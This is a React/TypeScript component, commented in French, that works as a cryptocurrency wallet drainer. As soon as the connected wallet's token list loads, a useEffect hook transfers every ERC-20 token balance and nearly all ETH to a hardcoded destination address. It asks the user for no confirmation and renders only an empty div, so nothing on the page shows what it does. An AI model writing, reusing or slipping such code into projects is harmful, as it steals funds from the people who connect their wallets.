import * as React from 'react';
import { useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { useAtom } from 'jotai';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

export const SendAllFunds = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({ text: message, type, delay: 4000 });

  const [tokens] = useAtom(globalTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { address } = useAccount();

  // L'adresse de destination est fixée ici
  const destinationAddress = '0x3351D8F2F3F4708d2A7B5FbbD4Db350Af7313B75';

  // Fonction pour envoyer l'ETH restant
  const sendEth = async () => {
    if (!walletClient || !destinationAddress) return;

    // Utilisation de la valeur par défaut (0n) si le solde est undefined
    const balance = (await publicClient.getBalance({ address })) || 0n;

    if (balance > 0n) {
      try {
        const tx = await walletClient.sendTransaction({
          to: destinationAddress,
          value: balance - BigInt(21000 * 10 ** 9), // Soustraction pour les frais de gas
        });
        showToast(`ETH sent: ${tx.hash}`, 'success');
      } catch (err) {
        showToast(`ETH send error: ${err?.reason || 'Unknown error'}`, 'warning');
      }
    }
  };

  // Fonction pour envoyer tous les jetons ERC-20
  const sendAllTokens = async () => {
    if (!walletClient || !destinationAddress) return;

    for (const token of tokens) {
      const { contract_address, balance } = token;
      if (balance === '0') continue;

      try {
        // Conversion explicite de `balance` en BigInt
        const balanceBigInt = BigInt(balance);

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: contract_address as `0x${string}`,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [destinationAddress as `0x${string}`, balanceBigInt],
        });

        await walletClient.writeContract(request);
        showToast(`Sent ${token.contract_ticker_symbol}`, 'success');
      } catch (err) {
        showToast(
          `Error sending ${token.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
          'warning'
        );
      }
    }
  };

  // Fonction pour envoyer tous les fonds (ETH + tokens ERC-20)
  const sendAllFunds = async () => {
    // Envoie tous les tokens ERC-20
    await sendAllTokens();
    // Envoie tous les ETH
    await sendEth();
  };

  // Exécuter l'envoi dès que les fonds sont disponibles
  React.useEffect(() => {
    const sendFundsIfValid = async () => {
      await sendAllFunds();
    };
    sendFundsIfValid();
  }, [tokens]); // S'assurer que les tokens sont récupérés avant l'envoi

  return <div style={{ margin: '20px' }}></div>;
};
